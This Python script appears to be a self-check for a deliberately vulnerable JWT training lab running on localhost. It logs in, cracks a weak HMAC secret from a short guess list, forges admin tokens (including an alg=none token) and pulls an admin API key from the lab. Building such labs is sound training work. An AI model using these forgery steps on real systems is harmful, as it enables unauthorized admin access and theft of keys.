#!/usr/bin/env python3
"""
Quick test script for JWT Authentication Bypass Lab
Tests basic functionality and vulnerability
"""

import requests
import jwt
import time
import json

def test_application():
    """Test basic application functionality"""
    base_url = "http://localhost:3206"
    
    print("🚀 Testing QuickInsure JWT Authentication Lab")
    print("=" * 50)
    
    # Test 1: Application accessibility
    print("1. Testing application accessibility...")
    try:
        response = requests.get(base_url, timeout=5)
        if response.status_code == 200 and "QuickInsure" in response.text:
            print("   ✅ Application is accessible")
        else:
            print("   ❌ Application not accessible")
            return False
    except Exception as e:
        print(f"   ❌ Error accessing application: {e}")
        return False
    
    # Test 2: Login functionality
    print("2. Testing login functionality...")
    try:
        login_data = {
            "username": "john.doe",
            "password": "Welcome2024!"
        }
        response = requests.post(f"{base_url}/api/login", json=login_data)
        if response.status_code == 200:
            data = response.json()
            if "access_token" in data:
                token = data["access_token"]
                print(f"   ✅ Login successful, token: {token[:20]}...")
            else:
                print("   ❌ No access token in response")
                return False
        else:
            print(f"   ❌ Login failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"   ❌ Error during login: {e}")
        return False
    
    # Test 3: JWT structure analysis
    print("3. Analyzing JWT structure...")
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print(f"   ✅ JWT payload: {json.dumps(decoded, indent=2)}")
        
        header = jwt.get_unverified_header(token)
        print(f"   ✅ JWT algorithm: {header['alg']}")
    except Exception as e:
        print(f"   ❌ Error decoding JWT: {e}")
        return False
    
    # Test 4: Weak secret cracking
    print("4. Testing weak secret cracking...")
    weak_secrets = ["secret", "admin", "quickinsure", "password"]
    weak_secret = None
    
    for secret in weak_secrets:
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            weak_secret = secret
            print(f"   ✅ Weak secret found: '{secret}'")
            break
        except jwt.InvalidSignatureError:
            continue
    
    if not weak_secret:
        print("   ❌ No weak secret found")
        return False
    
    # Test 5: Token forgery
    print("5. Testing token forgery...")
    try:
        forged_payload = {
            "sub": "admin",
            "role": "admin",
            "user_id": 2,
            "exp": int(time.time()) + 3600
        }
        forged_token = jwt.encode(forged_payload, weak_secret, algorithm="HS256")
        print(f"   ✅ Admin token forged: {forged_token[:20]}...")
    except Exception as e:
        print(f"   ❌ Error forging token: {e}")
        return False
    
    # Test 6: Admin endpoint access
    print("6. Testing admin endpoint access...")
    try:
        headers = {"Authorization": f"Bearer {forged_token}"}
        response = requests.get(f"{base_url}/api/admin/system-config", headers=headers)
        if response.status_code == 200:
            data = response.json()
            if "admin_api_key" in data:
                api_key = data["admin_api_key"]
                print(f"   ✅ Admin access successful!")
                print(f"   🎉 API Key: {api_key}")
            else:
                print("   ❌ No API key in response")
                return False
        else:
            print(f"   ❌ Admin access failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"   ❌ Error accessing admin endpoint: {e}")
        return False
    
    # Test 7: alg=none vulnerability
    print("7. Testing alg=none vulnerability...")
    try:
        payload = {
            "sub": "admin",
            "role": "admin",
            "user_id": 2,
            "exp": int(time.time()) + 3600
        }
        alg_none_token = jwt.encode(payload, "", algorithm="none")
        
        headers = {"Authorization": f"Bearer {alg_none_token}"}
        response = requests.get(f"{base_url}/api/admin/system-config", headers=headers)
        if response.status_code == 200:
            data = response.json()
            if "admin_api_key" in data:
                print(f"   ✅ alg=none attack successful!")
                print(f"   🎉 API Key: {data['admin_api_key']}")
            else:
                print("   ❌ No API key in alg=none response")
                return False
        else:
            print(f"   ❌ alg=none attack failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"   ❌ Error testing alg=none: {e}")
        return False
    
    print("\n🎉 All tests passed! The vulnerability is exploitable.")
    print("=" * 50)
    return True

if __name__ == "__main__":
    success = test_application()
    if not success:
        print("\n❌ Some tests failed. Please check the application.")
        exit(1) 